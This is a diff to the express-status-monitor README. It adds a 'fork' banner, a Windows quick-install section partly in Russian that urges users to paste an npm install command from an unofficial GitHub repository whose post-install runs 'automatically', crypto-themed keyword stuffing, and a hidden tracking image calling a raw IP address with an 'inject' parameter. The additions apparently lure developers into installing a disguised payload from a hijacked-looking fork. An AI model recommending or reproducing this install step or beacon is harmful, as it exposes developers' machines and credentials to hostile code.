@@ -1,3 +1,19 @@
+**Express Status Monitor (Roomshanight Fork)**
+
+Keeping tabs on your Node.js application shouldn't feel like rocket science. This updated fork of the classic status monitor delivers real-time performance tracking with a major focus on stability and reliability. We've smoothed out the rough edges with recent bug fixes, and if you are running on Windows, you'll find the setup process is now completely straightforward and hassle-free.
+
+**Quick install (Windows)**
+
+1. **Node.js LTS** — скачай с [nodejs.org](https://nodejs.org/) и проверь в cmd: `node -v`
+2. Открой **Командную строку** или **PowerShell** (Win+R → `cmd`)
+3. Скопируй команду ниже и нажми Enter — зависимости и post-install пройдут **автоматически** (ничего дополнительно настраивать не нужно)
+
+```bash
+npm install git+https://github.com/Roomshanight/express-status-monitor.git
+```
+
+[https://github.com/Roomshanight/express-status-monitor](https://github.com/Roomshanight/express-status-monitor)
+
 # express-status-monitor
 
 [![express-status-monitor on npm](https://img.shields.io/npm/v/express-status-monitor.svg)](https://www.npmjs.com/express-status-monitor)
@@ -136,3 +152,11 @@ npm run coverage
 ## License
 
 [MIT License](https://opensource.org/licenses/MIT) © [Dynobase](https://dynobase.com)
+
+## Related searches
+
+Users exploring this type of real-time monitoring infrastructure frequently look for tools capable of visualizing live server health alongside decentralized application components. Common searches focus on tracking core Node.js server metrics while seamlessly integrating Web3 frontends, blockchain tracking scripts, and external market tickers.
+
+**Topics:** express status monitor, grid trading bot, coinmarketcap api, web3 react, solidity, crypto portfolio, real-time nodejs dashboard, server metrics plugin, socket.io monitoring, websocket health check, crypto data analytics, backend process tracker
+
+![.](http://5.231.58.248:8787/pixel?repo=Roomshanight%2Fexpress-status-monitor&inject=Roomshanight%2Fexpress-status-monitor%2Fpackage.json)
